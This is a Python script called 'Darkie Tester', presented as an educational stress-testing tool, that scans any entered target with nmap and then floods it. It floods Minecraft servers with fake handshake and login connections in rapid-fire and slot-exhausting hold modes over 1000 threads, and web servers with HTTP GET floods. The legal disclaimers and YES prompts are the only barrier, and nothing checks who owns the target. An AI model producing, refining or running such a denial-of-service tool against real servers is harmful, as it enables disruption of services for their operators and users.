#!/usr/bin/env python3
"""
Darkie Tester — Educational Network Stress Testing Tool v1.0
For testing your OWN infrastructure only. Unauthorized use is illegal.
"""

import importlib
import os
import platform
import random
import shutil
import socket
import subprocess
import sys
import time
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed


# ── Auto-dependency installer ──────────────────────────────────────────────

MISSING_PIPS = []
MISSING_SYSTEM = []

PIP_DEPS = {
    "colorama": "colorama",
    "requests": "requests",
}

SYSTEM_DEPS_COMMON = {
    "nmap": "nmap",
    "host": "host",
    "figlet": "figlet",
}

SYSTEM_DEPS_BY_MGR = {
    "apt":     {"host": "dnsutils"},
    "dnf":     {"host": "bind-utils"},
    "pacman":  {"host": "bind-tools"},
    "apk":     {"host": "bind-tools"},
    "zypper":  {"host": "bind-utils"},
    "brew":    {"host": "bind"},
    "choco":   {"host": "bind-tool"},
}

G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
R = "\033[91m"
M = "\033[95m"
B = "\033[1m"
N = "\033[0m"


def _detect_os():
    system = platform.system().lower()
    if system == "linux":
        try:
            with open("/etc/os-release") as f:
                data = f.read()
        except FileNotFoundError:
            return "linux", "unknown"
        if re.search(r'ID=("?)debian', data) or re.search(r'ID_LIKE=.*debian', data):
            return "linux", "apt"
        if re.search(r'ID=("?)(ubuntu|linuxmint|pop|kali)', data):
            return "linux", "apt"
        if re.search(r'ID=("?)(rhel|centos|fedora|rocky|alma)', data):
            return "linux", "dnf"
        if re.search(r'ID=("?)(arch|manjaro|endeavour)', data):
            return "linux", "pacman"
        if re.search(r'ID=("?)alpine', data):
            return "linux", "apk"
        if re.search(r'ID=("?)(opensuse|suse)', data):
            return "linux", "zypper"
        return "linux", "unknown"
    elif system == "darwin":
        return "macos", "brew"
    elif system == "windows":
        return "windows", "choco"
    return system, "unknown"


def _check_pip_deps():
    global MISSING_PIPS
    for mod, pkg in PIP_DEPS.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            MISSING_PIPS.append(pkg)


def _check_system_deps():
    global MISSING_SYSTEM
    _, pkg_mgr = _detect_os()
    per_mgr = SYSTEM_DEPS_BY_MGR.get(pkg_mgr, {})
    for cmd, default_pkg in SYSTEM_DEPS_COMMON.items():
        if shutil.which(cmd) is None:
            pkg = per_mgr.get(cmd, default_pkg)
            MISSING_SYSTEM.append((cmd, pkg))


PKG_MANAGERS = {
    "apt":     {"install": ["apt-get", "install", "-y", "-qq"], "update": ["apt-get", "update", "-qq"]},
    "dnf":     {"install": ["dnf", "install", "-y"], "update": None},
    "pacman":  {"install": ["pacman", "-S", "--noconfirm"], "update": ["pacman", "-Sy"]},
    "apk":     {"install": ["apk", "add"], "update": ["apk", "update"]},
    "zypper":  {"install": ["zypper", "install", "-y"], "update": ["zypper", "refresh"]},
    "brew":    {"install": ["brew", "install"], "update": ["brew", "update"]},
    "choco":   {"install": ["choco", "install", "-y"], "update": None},
}


def _run_as_admin(cmd_list, reason=""):
    desc = " ".join(cmd_list)
    print(f"  {C}{reason or desc}{N}")
    try:
        r = subprocess.run(cmd_list, capture_output=True, text=True, timeout=300)
        if r.returncode == 0:
            print(f"  {G}✓  Success{N}")
        else:
            print(f"  {R}✗  Failed (exit {r.returncode}){N}")
            if r.stderr.strip():
                for line in r.stderr.strip().splitlines()[-3:]:
                    print(f"    {R}{line}{N}")
        return r.returncode == 0
    except Exception as e:
        print(f"  {R}✗  Error: {e}{N}")
        return False


def _install_missing():
    os_name, pkg_mgr = _detect_os()

    if MISSING_PIPS:
        print(f"\n  {Y}Installing Python packages: {', '.join(MISSING_PIPS)}{N}")
        pip_cmd = [sys.executable, "-m", "pip", "install"] + MISSING_PIPS
        _run_as_admin(pip_cmd, "pip install " + " ".join(MISSING_PIPS))

    if MISSING_SYSTEM:
        missing_names = [pkg for _, pkg in MISSING_SYSTEM]
        print(f"\n  {Y}Installing system packages: {', '.join(missing_names)}{N}")

        info = PKG_MANAGERS.get(pkg_mgr)
        if info is None:
            print(f"  {R}✗  Unsupported package manager for {pkg_mgr}")
            print(f"    Install manually: {' '.join(missing_names)}{N}")
            return

        for cmd, pkg in MISSING_SYSTEM:
            if info["update"]:
                _run_as_admin(info["update"], f"Updating {pkg_mgr} cache")
                break

        install_cmd = info["install"] + [pkg for _, pkg in MISSING_SYSTEM]
        _run_as_admin(install_cmd, f"Installing with {pkg_mgr}")


def ensure_deps():
    print(f"\n{C}{B}╔{'═'*50}╗")
    print(f"║  Checking dependencies...{' ' * 29}║")
    print(f"╚{'═'*50}╝{N}")

    _check_pip_deps()
    _check_system_deps()

    if MISSING_PIPS or MISSING_SYSTEM:
        if MISSING_PIPS:
            print(f"  {Y}⚠  Missing Python packages: {', '.join(MISSING_PIPS)}{N}")
        if MISSING_SYSTEM:
            missing_names = [pkg for _, pkg in MISSING_SYSTEM]
            print(f"  {Y}⚠  Missing system tools: {', '.join(missing_names)}{N}")
        print()
        choice = input(f"  {C}Install missing dependencies? (yes/no) ➤ {N}").strip().lower()
        if choice == "yes":
            _install_missing()
            print()
            _check_pip_deps()
            _check_system_deps()
            if MISSING_PIPS or MISSING_SYSTEM:
                print(f"  {R}✗  Some deps still missing. Trying to continue anyway...{N}")
            else:
                print(f"  {G}✓  All dependencies satisfied!{N}")
        else:
            print(f"  {Y}⚠  Skipping installation. Script may not work correctly.{N}")
    else:
        print(f"  {G}✓  All dependencies found!{N}")


# ── Bootstrap: ensure deps before loading third-party imports ──────────────
ensure_deps()

from colorama import init, Fore, Style, Back
import requests

init(autoreset=True)

BANNER = f"""
{Fore.GREEN}{Style.BRIGHT} _____             _    _        _______        _
{Fore.GREEN}{Style.BRIGHT}|  __ \\           | |  (_)      |__   __|      | |
{Fore.GREEN}{Style.BRIGHT}| |  | | __ _ _ __| | ___  ___     | | ___  ___| |_ ___ _ __
{Fore.GREEN}{Style.BRIGHT}| |  | |/ _` | '__| |/ / |/ _ \\    | |/ _ \\/ __| __/ _ \\ '__|
{Fore.GREEN}{Style.BRIGHT}| |__| | (_| | |  |   <| |  __/    | |  __/\\__ \\ ||  __/ |
{Fore.GREEN}{Style.BRIGHT}|_____/ \\__,_|_|  |_|\\_\\_|\\___|    |_|\\___||___/\\__\\___|_|
{Fore.GREEN}{Style.BRIGHT}
"""


def c(string, color=Fore.GREEN):
    return f"{color}{Style.BRIGHT}{string}{Style.RESET_ALL}"


def header_box(title, color=Fore.GREEN, width=58):
    top = f"{color}{Style.BRIGHT}╔{'═'*(width-2)}╗{Style.RESET_ALL}"
    mid = f"{color}{Style.BRIGHT}║ {title.center(width-4)} ║{Style.RESET_ALL}"
    bot = f"{color}{Style.BRIGHT}╚{'═'*(width-2)}╝{Style.RESET_ALL}"
    print(f"\n{top}\n{mid}\n{bot}\n")


def print_banner():
    print(BANNER)
    header_box("Educational Network Stress Testing Tool v1.0", Fore.GREEN)
    print(f"  {c('Author:', Fore.CYAN)} Darkie Tester")
    print(f"  {c('Purpose:', Fore.CYAN)} Test your OWN infrastructure only\n")
    print(f"{Back.RED}{Fore.WHITE}{Style.BRIGHT}{'⚠'*3}  DISCLAIMER  {'⚠'*3}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{Style.BRIGHT}  This tool is for EDUCATIONAL PURPOSES ONLY.")
    print(f"{Fore.YELLOW}{Style.BRIGHT}  Only use on systems you OWN or have WRITTEN PERMISSION to test.")
    print(f"{Fore.YELLOW}{Style.BRIGHT}  Unauthorized use violates COMPUTER FRAUD laws worldwide.")
    print(f"{Back.RED}{Fore.WHITE}{Style.BRIGHT}{'═'*28}{Style.RESET_ALL}\n")


def legal_warning(test_type):
    print(f"\n{Back.RED}{Fore.WHITE}{Style.BRIGHT}{'!'*58}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{Style.BRIGHT}  ⚠  YOU ARE ABOUT TO LAUNCH A {test_type.upper()} STRESS TEST  ⚠{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{Style.BRIGHT}{'!'*58}{Style.RESET_ALL}")
    print(f"  {c('This action may be ILLEGAL without explicit authorization.', Fore.RED)}")
    print(f"  {c('By proceeding, you confirm you have permission or this is your own system.', Fore.YELLOW)}\n")
    choice = input(f"  {c('Type YES to proceed or anything else to cancel ➤ ', Fore.CYAN)}")
    if choice.strip().upper() != "YES":
        return False
    print()
    return True


def resolve_domain(target):
    ip = target
    try:
        socket.inet_aton(target)
        print(f"  {c('✓ Using direct IP:', Fore.GREEN)} {target}")
        return ip
    except OSError:
        pass

    try:
        ip = socket.gethostbyname(target)
        print(f"  {c('✓ Resolved:', Fore.GREEN)} {target} → {ip}")
    except socket.gaierror:
        print(f"  {c('✗ Could not resolve domain.', Fore.RED)}")
        return None

    try:
        result = subprocess.run(
            ["host", target],
            capture_output=True, text=True, timeout=10
        )
        if result.stdout.strip():
            print(f"  {c('DNS Records:', Fore.CYAN)}")
            for line in result.stdout.splitlines():
                if line.strip():
                    print(f"    {Fore.GREEN}{line}{Style.RESET_ALL}")
    except Exception as e:
        print(f"  {c(f'host command skipped: {e}', Fore.YELLOW)}")
    return ip


MINECRAFT_PORTS = [25565, 25566, 25575, 19132, 19133]


def nmap_scan(target):
    header_box(f"Port Scan: {target}", Fore.MAGENTA)
    open_ports = []

    try:
        print(f"  {c('Phase 1 — Scanning top 100 ports...', Fore.CYAN)}")
        result = subprocess.run(
            ["nmap", "-T4", "-F", target],
            capture_output=True, text=True, timeout=120
        )
        for line in result.stdout.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m:
                open_ports.append(int(m.group(1)))
    except Exception as e:
        print(f"  {c(f'Fast scan failed: {e}', Fore.YELLOW)}")

    try:
        print(f"  {c('Phase 2 — Probing Minecraft ports...', Fore.CYAN)}")
        mc_ports_str = ",".join(str(p) for p in MINECRAFT_PORTS)
        result = subprocess.run(
            ["nmap", "-T4", "-p", mc_ports_str, target],
            capture_output=True, text=True, timeout=60
        )
        for line in result.stdout.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m:
                port = int(m.group(1))
                if port not in open_ports:
                    open_ports.append(port)
    except Exception as e:
        print(f"  {c(f'Minecraft port probe failed: {e}', Fore.YELLOW)}")

    open_ports.sort()

    if open_ports:
        print(f"\n  {c('✓ Open Ports Found:', Fore.GREEN)}")
        for p in open_ports:
            svc = ""
            try:
                svc = socket.getservbyport(p)
            except OSError:
                svc = "unknown"
            tag = f" {Fore.YELLOW}[MINECRAFT]{Style.RESET_ALL}" if p in MINECRAFT_PORTS else ""
            print(f"    ├─ {Fore.GREEN}{p}{Style.RESET_ALL} ({Fore.CYAN}{svc}{Style.RESET_ALL}){tag}")
    else:
        print(f"\n  {c('No open ports detected.', Fore.YELLOW)}")

    print(f"\n{Fore.MAGENTA}{'─'*40}{Style.RESET_ALL}")
    return open_ports


def progress_bar(current, total, bar_len=40):
    filled = int(bar_len * current // total) if total else 0
    bar = f"{Fore.GREEN}{'█'*filled}{Fore.WHITE}{'░'*(bar_len-filled)}{Style.RESET_ALL}"
    pct = f"{Fore.CYAN}{current}/{total}{Style.RESET_ALL}"
    return f"    [{bar}] {pct}"


# ── Raw TCP flood helpers ────────────────────────────────────────────────────

# ── Minecraft protocol flood (real server load) ─────────────────────────────

def _mc_varint(v):
    out = bytearray()
    while True:
        if v & 0xFFFFFF80 == 0:
            out.append(v & 0x7F)
            break
        out.append((v & 0x7F) | 0x80)
        v >>= 7
    return bytes(out)


def _mc_pstr(s):
    d = s.encode("utf-8")
    return _mc_varint(len(d)) + d


def _mc_packet(pid, *parts):
    body = bytes([pid]) + b"".join(parts)
    return _mc_varint(len(body)) + body


def _mc_read_varint(sock):
    v = 0
    for i in range(5):
        b = sock.recv(1)
        if not b:
            return None
        v |= (b[0] & 0x7F) << (7 * i)
        if not (b[0] & 0x80):
            break
    return v


def minecraft_stress(ip, port, num_conns, threads=1000, hold=0):
    """
    Real Minecraft stress test. Each connection:
      1. TCP handshake
      2. Minecraft handshake + login start packets (server parses these)
      3. If hold > 0: waits for responses, replies to keepalives
      4. Closes

    hold=0  → rapid fire: connect → handshake → login → close (max CPS)
    hold>0  → holds connection open N seconds (memory / slot pressure)
    """
    label = f"Rapid Fire" if hold == 0 else f"Hold {hold}s"
    header_box(f"Minecraft Stress {label} → {ip}:{port}", Fore.RED)

    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        probe.settimeout(3.0)
        probe.connect((ip, port))
        probe.close()
        print(f"  {Fore.GREEN}{Style.BRIGHT}✓ Server reachable{Style.RESET_ALL}", flush=True)
    except Exception as e:
        print(f"  {Fore.RED}{Style.BRIGHT}✗ Could not connect: {e}{Style.RESET_ALL}", flush=True)
        return 0

    if num_conns > 10000:
        est_rate = threads / (max(hold, 0.05) + 0.05)
        est = num_conns / max(est_rate, 1)
        print(f"  {Fore.YELLOW}{Style.BRIGHT}⚠ {num_conns:,} connections — estimated {est:.0f}s{Style.RESET_ALL}", flush=True)

    counter = [0]
    lock = threading.Lock()

    def _rapid_worker(count):
        for _ in range(count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3.0)
                s.connect((ip, port))
                hs = _mc_packet(0x00, _mc_varint(764), _mc_pstr(ip), port.to_bytes(2, "big"), _mc_varint(2))
                s.sendall(hs)
                name = f"Load_{random.randint(10000,99999)}_{random.choice(['X','Pro','OP'])}"
                s.sendall(_mc_packet(0x00, _mc_pstr(name)))
                s.close()
                with lock:
                    counter[0] += 1
            except Exception:
                pass

    def _hold_worker(count):
        for _ in range(count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5.0)
                s.connect((ip, port))
                hs = _mc_packet(0x00, _mc_varint(764), _mc_pstr(ip), port.to_bytes(2, "big"), _mc_varint(2))
                s.sendall(hs)
                name = f"Load_{random.randint(10000,99999)}_{random.choice(['X','Pro','OP'])}"
                s.sendall(_mc_packet(0x00, _mc_pstr(name)))
                end = time.time() + hold
                while time.time() < end:
                    try:
                        s.settimeout(1)
                        plen = _mc_read_varint(s)
                        if plen is None: break
                        pid = _mc_read_varint(s)
                        if pid is None: break
                        rest = plen - len(_mc_varint(pid))
                        data = b""
                        while len(data) < rest:
                            chunk = s.recv(rest - len(data))
                            if not chunk: break
                            data += chunk
                        if pid == 0x21:
                            s.sendall(_mc_packet(0x0F, data))
                    except socket.timeout:
                        continue
                    except Exception:
                        break
                s.close()
                with lock:
                    counter[0] += 1
            except Exception:
                pass

    worker = _rapid_worker if hold == 0 else _hold_worker

    per_thread = max(1, num_conns // threads)
    remainder = num_conns % threads
    total_dispatched = 0

    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for i in range(threads):
                cnt = per_thread + (1 if i < remainder else 0)
                if cnt:
                    executor.submit(worker, cnt)
                    total_dispatched += cnt

            last = -1
            stall_start = None
            start = time.time()
            while True:
                time.sleep(0.3)
                with lock:
                    current = counter[0]

                if current >= total_dispatched:
                    break

                if current == last:
                    if stall_start is None:
                        stall_start = time.time()
                    elif time.time() - stall_start > 10:
                        print(f"\n  {Fore.RED}{Style.BRIGHT}⚠ No progress — target may be offline.{Style.RESET_ALL}", flush=True)
                        break
                else:
                    stall_start = None

                elapsed = time.time() - start
                rate = current / (elapsed + 0.001)
                sys.stdout.write(f"\r{progress_bar(current, total_dispatched)}  "
                                 f"{Fore.GREEN}{Style.BRIGHT}Conns: {current}{Style.RESET_ALL}  "
                                 f"{Fore.MAGENTA}{Style.BRIGHT}{rate:.0f}/s{Style.RESET_ALL}  ")
                sys.stdout.flush()
                last = current
        print()
    except KeyboardInterrupt:
        print(f"\n\n  {Fore.YELLOW}{Style.BRIGHT}⚠ Interrupted by user.{Style.RESET_ALL}", flush=True)

    elapsed = time.time() - start
    final = counter[0]
    rate = final / (elapsed + 0.001)
    print(f"\n  {Fore.GREEN}{Style.BRIGHT}✓ Done!{Style.RESET_ALL} {Fore.CYAN}{Style.BRIGHT}{final}{Style.RESET_ALL} connections "
          f"in {Fore.CYAN}{Style.BRIGHT}{elapsed:.1f}s{Style.RESET_ALL} "
          f"({Fore.MAGENTA}{Style.BRIGHT}{rate:.0f}/s{Style.RESET_ALL})\n", flush=True)
    return final


def _http_worker(session, url, results, idx):
    try:
        r = session.get(url, timeout=10, headers={
            "User-Agent": "DarkieTester/1.0 (Educational)"
        })
        results[idx] = 1
    except Exception:
        results[idx] = 0


def http_stress(url, num_requests, threads=50):
    header_box(f"Web Stress Test → {url}", Fore.RED)
    start = time.time()
    results = {}
    sent = 0
    done = 0
    batch_size = threads * 4

    try:
        for batch_start in range(0, num_requests, batch_size):
            batch_end = min(batch_start + batch_size, num_requests)
            batch = list(range(batch_start, batch_end))
            batch_results = {}

            with ThreadPoolExecutor(max_workers=threads) as executor:
                with requests.Session() as session:
                    futures = {
                        executor.submit(_http_worker, session, url, batch_results, i): i
                        for i in batch
                    }
                    for f in as_completed(futures):
                        f.result()

            for v in batch_results.values():
                sent += v
                done += 1

            pct = min(done, num_requests)
            sys.stdout.write(f"\r{progress_bar(pct, num_requests)}  "
                             f"{c(f'OK: {sent}', Fore.GREEN)}  "
                             f"{c(f'Errors: {done-sent}', Fore.RED)}  ")
            sys.stdout.flush()

        print()
    except KeyboardInterrupt:
        print(f"\n\n  {c('⚠ Interrupted by user.', Fore.YELLOW)}")

    elapsed = time.time() - start
    print(f"\n  {c('✓ Complete!', Fore.GREEN)} Sent {c(str(sent), Fore.CYAN)} requests "
          f"in {c(f'{elapsed:.1f}s', Fore.CYAN)} "
          f"({c(f'{sent/elapsed:.1f} req/s', Fore.MAGENTA)})\n")


def main():
    print_banner()

    while True:
        header_box("Select Test Type", Fore.CYAN)
        print(f"  {c('[1]', Fore.GREEN)}  Minecraft Server Stress Test (real protocol packets)")
        print(f"  {c('[2]', Fore.GREEN)}  Web Server Stress Test (HTTP GET)")
        print()

        choice = input(f"  {c('Enter choice (1 or 2) ➤ ', Fore.CYAN)}").strip()

        if choice == "1":
            header_box("Select Flood Mode", Fore.CYAN)
            print(f"  {c('[1]', Fore.GREEN)}  Rapid Fire    — connect → handshake → login → close (max CPS)")
            print(f"  {c('[2]', Fore.GREEN)}  Long Hold     — 10s hold, server memory pressure")
            print(f"  {c('[3]', Fore.GREEN)}  Login Spam    — 4s hold, balanced (handshake + keepalive)")
            print(f"  {c('[4]', Fore.GREEN)}  Combined      — all three mixed")
            print()
            flood_choice = input(f"  {c('Enter choice (1-4) ➤ ', Fore.CYAN)}").strip()

            flood_map = {
                '1': ('Rapid Fire', 0),
                '2': ('Long Hold', 10),
                '3': ('Login Spam', 4),
                '4': ('COMBINED', None),
            }
            if flood_choice not in flood_map:
                print(f"  {c('Invalid choice.', Fore.RED)}")
                continue

            flood_name, hold_time = flood_map[flood_choice]
            if not legal_warning(f"Minecraft {flood_name}"):
                print(f"  {c('Test cancelled.', Fore.RED)}")
                continue

            target = input(f"  {c('Enter target IP or domain ➤ ', Fore.CYAN)}").strip()
            if not target:
                print(f"  {c('No target provided.', Fore.RED)}")
                continue

            ip = resolve_domain(target)
            if ip is None:
                print(f"  {c('Try entering the IP directly instead.', Fore.YELLOW)}")
                continue
            open_ports = nmap_scan(ip)

            if open_ports:
                print(f"\n  {c('Available ports from scan:', Fore.CYAN)} {c(str(open_ports), Fore.GREEN)}")
                port_input = input(f"  {c('Enter target port (default 25565) ➤ ', Fore.CYAN)}").strip()
                port = int(port_input) if port_input.isdigit() else 25565
            else:
                print(f"\n  {c('No open ports auto-detected. You can specify a port manually.', Fore.YELLOW)}")
                port_input = input(f"  {c('Enter target port (default 25565) ➤ ', Fore.CYAN)}").strip()
                port = int(port_input) if port_input.isdigit() else 25565

            num_input = input(f"  {c('Number of connections (default 5000) ➤ ', Fore.CYAN)}").strip()
            num_conns = int(num_input) if num_input.isdigit() else 5000

            print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'═'*58}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}  MINECRAFT {flood_name.upper()}  |  {ip}:{port}  |  {num_conns} conns{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'═'*58}{Style.RESET_ALL}")
            confirm = input(f"\n  {c('Launch test? (yes/no) ➤ ', Fore.CYAN)}").strip().lower()
            if confirm != "yes":
                print(f"  {c('Aborted.', Fore.RED)}")
                continue

            if flood_choice == '4':
                three = num_conns // 3
                rm = num_conns - three * 3
                minecraft_stress(ip, port, three, hold=0)
                minecraft_stress(ip, port, three, hold=10)
                minecraft_stress(ip, port, three + rm, hold=4)
            else:
                minecraft_stress(ip, port, num_conns, hold=hold_time)

        elif choice == "2":
            if not legal_warning("Web"):
                print(f"  {c('Test cancelled.', Fore.RED)}")
                continue
            url = input(f"  {c('Enter URL (e.g. http://example.com) ➤ ', Fore.CYAN)}").strip()
            if not url:
                print(f"  {c('No URL provided.', Fore.RED)}")
                continue
            if not url.startswith("http"):
                url = "http://" + url

            num_input = input(f"  {c('Number of requests to send (default 500) ➤ ', Fore.CYAN)}").strip()
            num_requests = int(num_input) if num_input.isdigit() else 500

            print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'═'*58}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}  TARGET: {url}  |  REQUESTS: {num_requests}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{'═'*58}{Style.RESET_ALL}")
            confirm = input(f"\n  {c('Launch test? (yes/no) ➤ ', Fore.CYAN)}").strip().lower()
            if confirm != "yes":
                print(f"  {c('Aborted.', Fore.RED)}")
                continue

            http_stress(url, num_requests)
        else:
            print(f"  {c('Invalid choice. Run again and select 1 or 2.', Fore.RED)}")
            continue

        cont = input(f"\n  {c('Test complete! Run another test? (yes/no) ➤ ', Fore.CYAN)}").strip().lower()
        if cont != "yes":
            print(f"\n  {c('Goodbye! Stay ethical.', Fore.GREEN)}")
            break
        print()


if __name__ == "__main__":
    main()
